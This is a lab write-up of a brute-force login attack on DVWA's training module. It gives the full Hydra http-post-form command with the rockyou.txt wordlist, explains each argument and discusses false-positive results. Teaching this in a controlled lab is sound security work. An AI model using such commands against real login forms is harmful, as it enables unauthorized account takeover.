# ✅ Simulation 3 – Brute Force Attack on DVWA Login (Using Hydra)

This simulation demonstrates how attackers can perform a brute-force attack to guess login credentials using `hydra`, targeting DVWA's **Brute Force** vulnerability module.

The goal is to:
- Understand the behavior of brute-force attacks
- Use real tools (`hydra` + `rockyou.txt`)
- Identify login weaknesses
- Evaluate response handling
- Simulate a login breach

---

## 🎯 Objective

Perform an **automated brute-force login attack** against the DVWA (Damn Vulnerable Web App) Brute Force module, using a known username (`admin`) and attempting to discover a valid password from a popular wordlist (`rockyou.txt`).

---

## 🔍 Manual Analysis of the Form

We manually examined the login form using browser developer tools:

- Method: `POST`
- URL: `/DVWA/vulnerabilities/brute/`
- POST fields:  
  `username=...&password=...&Login=Login`
- On failure: the page shows the message  
  `"Username and/or password incorrect."`

This means we can use that string as the **failure condition** in Hydra.

---

## 📦 Wordlist Used

The `rockyou.txt` wordlist was used, which contains millions of real leaked passwords.

```bash
ls /usr/share/wordlists/rockyou.txt
```

If not extracted, it must be unzipped using:

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 💣 Hydra Command Used

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.188 http-post-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
```

### 🔍 Breakdown of Command:

| Part | Purpose |
|------|---------|
| `-l admin` | Use the username `admin` |
| `-P /usr/share/wordlists/rockyou.txt` | Password list to try |
| `192.168.1.188` | Target host (DVWA server) |
| `http-post-form` | Attack module for HTTP POST login |
| `/DVWA/vulnerabilities/brute/` | Login form path |
| `username=^USER^&password=^PASS^&Login=Login` | POST data template |
| `Username and/or password incorrect.` | Failure condition string |

---

## 🧪 Execution & Result

After running the above command, Hydra identified multiple password candidates as valid. But DVWA is designed to accept only `admin : password` in this module.

![Hydra Brute Force Output](../../Screenshots/Bruteforce.png)

*Figure 1: Hydra Results*

### ✅ Real Working Login:
Only one pair actually succeeds:
```
Username: admin
Password: password
```

Others (e.g., `admin : 123456`) are **false positives** — Hydra assumed success due to different responses, but they don’t work in DVWA’s logic.

---

## 🧠 Understanding False Positives

Hydra considers a login **successful** if the failure message is **absent**. So if the page response changes slightly (e.g. due to session or timing), it may misinterpret it as success.

This is why we must **manually verify** cracked passwords afterward.

---

## 🧠 Lessons Learned

- Brute-force attacks are effective if no protection is in place
- Response-based tools like Hydra must be fine-tuned with accurate failure strings
- Even a vulnerable app like DVWA can have **logic limits** (only `admin : password` accepted)
- Always verify tool output with manual testing

---

## 📌 Summary

This simulation provides a clear example of how brute-force attacks work, what tools are used, and how to interpret and validate results in a controlled lab environment.